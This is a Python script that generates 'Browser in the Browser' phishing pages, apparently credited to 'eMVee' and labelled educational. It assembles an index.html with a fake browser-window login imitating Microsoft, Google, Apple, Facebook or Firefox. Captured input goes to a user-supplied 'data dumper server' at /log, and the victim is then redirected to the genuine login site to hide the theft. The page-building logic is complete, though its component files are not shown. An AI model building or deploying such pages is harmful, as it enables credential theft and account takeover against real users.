#!/usr/bin/env python3
import os
import sys

OUTPUT_FILE = "index.html" 

def display_banner():
    """Prints the application startup graphic banner interface."""
    RESET = "\033[0m"
    RED = "\033[91m"

    print(f"""
    {RED}██████╗ ███████╗██████╗ {RESET}      ██████╗ ██╗████████╗██████╗ 
    {RED}██╔══██╗██╔════╝██╔══██╗{RESET}      ██╔══██╗██║╚══██╔══╝██╔══██╗
    {RED}██████╔╝█████╗  ██║  ██║{RESET}█████╗██████╔╝██║   ██║   ██████╔╝
    {RED}██╔══██╗██╔══╝  ██║  ██║{RESET}╚════╝██╔══██╗██║   ██║   ██╔══██╗
    {RED}██║  ██║███████╗██████╔╝{RESET}      ██████╔╝██║   ██║   ██████╔╝
    {RED}╚═╝  ╚═╝╚══════╝╚═════╝ {RESET}      ╚═════╝ ╚═╝   ╚═╝   ╚═════╝ 
    {RED}Browser in the Browser demo Generator created by {RESET}eMVee                                                  
    """)

def discover_components(prefix):
    """
    Scans the 'componenten' directory and filters files that start with the given prefix.
    Returns a sorted list of clean names (without prefix and extension).
    """
    items = []
    if not os.path.exists("componenten"):
        return items
        
    for current_file in os.listdir("componenten"):
        if current_file.startswith(prefix) and current_file.endswith(".html"):
            clean_name = current_file.replace(prefix, "").replace(".html", "")
            items.append(clean_name)
    return sorted(items)

def compile_template(login_service, supported_browsers, server_url):
    print(f"\n[ * ] BitB Modular Compiler initialized...")
    print(f"[   ] Selected login service: {login_service.upper()}")
    print(f"[   ] Embedded browser styles: {', '.join(supported_browsers).upper()}")
    print(f"[   ] Target data-receiver URL: {server_url}")
    print(f"[   ] Browser detection configured to: AUTOMATIC (Client-side)")
    
    # Mapping to link each template to its legitimate login page for seamless redirection
    redirect_mapping = {
        "microsoft": "https://login.microsoftonline.com",
        "google": "https://accounts.google.com",
        "firefox": "https://accounts.firefox.com",
        "facebook": "https://www.facebook.com",
        "apple": "https://appleid.apple.com"
    }
    
    # Fallback to a safe search engine if the service name is not in the mapping
    target_redirect = redirect_mapping.get(login_service.lower(), "https://www.google.com")
    
    # Generate dynamic authentication header text based on the selected login service
    service_name_formatted = login_service.capitalize()
    launcher_header_text = f"Authentication Required for {service_name_formatted}"
    
    try:
        # 1. Read all structural components as text strings safely
        with open("componenten/core_css.html", "r", encoding="utf-8") as f:
            css_content = f.read()

        with open("componenten/core_js.html", "r", encoding="utf-8") as f:
            js_content = f.read()

        with open("componenten/database_headers.html", "r", encoding="utf-8") as f:
            db_headers = f.read()

        with open(f"componenten/login_{login_service}.html", "r", encoding="utf-8") as f:
            login_content = f.read()

        # 2. Main HTML skeleton structure with data attributes and custom placeholders
        # ADDED: data-server-url placeholder to pass the custom IP down to JavaScript
        html_skeleton = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Educational BitB Simulation (Dynamic)</title>
    <!-- [CSS_PLACEHOLDER] -->
</head>
<body data-allowed-browsers="[ALLOWED_BROWSERS_PLACEHOLDER]" data-redirect-url="[REDIRECT_URL_PLACEHOLDER]" data-server-url="[SERVER_IP_PLACEHOLDER]">

    <div class="launcher-box">
        <h2>[LAUNCHER_TEXT_PLACEHOLDER]</h2>
        <p>Please click the button below to initiate the secure identity verification procedure.</p>
        <button class="open-btn" onclick="openFakeWindow()">Authenticate</button>
    </div>

    <div id="bitbWindow" class="fake-window">
        <!-- JS will dynamically inject the browser specific top navigation header here -->
        <div id="dynamicHeaderContainer"></div>
        
        <div class="fake-content">
            <!-- [LOGIN_PLACEHOLDER] -->
            <div id="loaderContainer" style="display: none; padding: 40px 0; text-align:center;">
                <div class="loader-spinner"></div>
                <p style="font-size: 14px; margin-top: 20px; color:#555;">Processing validation data...</p>
            </div>
        </div>
    </div>

    <!-- [DB_HEADERS_PLACEHOLDER] -->
    <!-- [JS_PLACEHOLDER] -->
</body>
</html>"""

        # 3. String replacement executing dynamic template configuration building
        allowed_browsers_str = ",".join(supported_browsers)
        compiled_html = html_skeleton
        compiled_html = compiled_html.replace("[ALLOWED_BROWSERS_PLACEHOLDER]", allowed_browsers_str)
        compiled_html = compiled_html.replace("[REDIRECT_URL_PLACEHOLDER]", target_redirect)
        compiled_html = compiled_html.replace("[LAUNCHER_TEXT_PLACEHOLDER]", launcher_header_text)
        compiled_html = compiled_html.replace("[SERVER_IP_PLACEHOLDER]", server_url) # Inject custom server IP
        compiled_html = compiled_html.replace("<!-- [CSS_PLACEHOLDER] -->", css_content)
        compiled_html = compiled_html.replace("<!-- [LOGIN_PLACEHOLDER] -->", login_content)
        compiled_html = compiled_html.replace("<!-- [DB_HEADERS_PLACEHOLDER] -->", db_headers)
        compiled_html = compiled_html.replace("<!-- [JS_PLACEHOLDER] -->", js_content)

        # 4. Exporting compiled final deployment code into the root output path
        with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
            f.write(compiled_html)
            
        print(f"[ + ] Success! '{OUTPUT_FILE}' has been generated.")
        print(f"[ + ] Data logs will post back to: {server_url}/log")
        print(f"[ + ] Post-back tracking target mapped to: {target_redirect}\n")

    except Exception as e:
        print(f"[ ! ] Error encountered during compilation sequence: {e}")

if __name__ == "__main__":
    display_banner()
    lines = "=" * 75
    print(lines)
    print("  BITB INTERACTIVE COMPILER CONSOLE ")
    print(lines)
    
    # STEP 1: DYNAMIC BROWSER EMULATION SELECTION
    available_browsers = discover_components("header_")
    if not available_browsers:
        print("[ ! ] Error: No 'header_*.html' files discovered within 'componenten' directory.")
        sys.exit(1)
        
    print("[*] Which browsers should be supported by the auto-detection interface?")
    print("  [0] ALL BROWSERS (Compile comprehensive multi-engine support frame)")
    for index, browser in enumerate(available_browsers, start=1):
        print(f"  [{index}] Only {browser.capitalize()}")
    print(lines)
    
    try:
        browser_input = input("[>] Enter the number of your choice (0 or matching ID): ").strip()
        
        if browser_input == "0":
            selected_browsers = available_browsers
        else:
            browser_index = int(browser_input) - 1
            if 0 <= browser_index < len(available_browsers):
                selected_browsers = [available_browsers[browser_index]]
            else:
                print("[ ! ] Invalid browser configuration choice selected. Compilation aborted.")
                sys.exit(1)
                
        # STEP 2: DYNAMIC LOGIN SERVICE SELECTION
        print("\n" + "=" * 50)
        print("  SELECT TARGET AUTHENTICATION SERVICE ")
        print("=" * 50)
        
        available_services = discover_components("login_")
        if not available_services:
            print("[ ! ] Error: No 'login_*.html' files discovered within 'componenten' directory.")
            sys.exit(1)
            
        for index, service in enumerate(available_services, start=1):
            print(f"  [{index}] {service.capitalize()}")
        print("=" * 50)
        
        service_input = input("[>] Enter the number of your login service choice: ").strip()
        service_index = int(service_input) - 1
        
        if not (0 <= service_index < len(available_services)):
            print("[ ! ] Invalid service configuration choice selected.")
            sys.exit(1)
            
        # STEP 3: CUSTOM RECEIVER SERVER CONFIGURATION (NEW STEP)
        print("\n" + "=" * 50)
        print("  RECEIVING SERVER IP / DOMAIN CONFIGURATION ")
        print("=" * 50)
        print("[*] Enter the host address where your data dumper server is listening.")
        print("[*] Press Enter to keep default (relative path / local host).")
        server_input = input("[>] IP/Domain (e.g., 192.168.1.50 or ctf.local): ").strip()
        
        # Clean protocol attachments and format destination
        if not server_input:
            final_server_url = "" # Keeps relative path fallback intact
        else:
            # Ensure protocol mapping is applied clean
            if not server_input.startswith("http://") and not server_input.startswith("https://"):
                final_server_url = "http://" + server_input
            else:
                final_server_url = server_input
            # Strip trailing slash if entered by mistake
            final_server_url = final_server_url.rstrip("/")
            
        # Execute the compilation engine with all parameters mapped
        compile_template(available_services[service_index], selected_browsers, final_server_url)
            
    except (ValueError, KeyboardInterrupt):
        print("\n[ ! ] Interaction sequence interrupted. Execution terminated.")
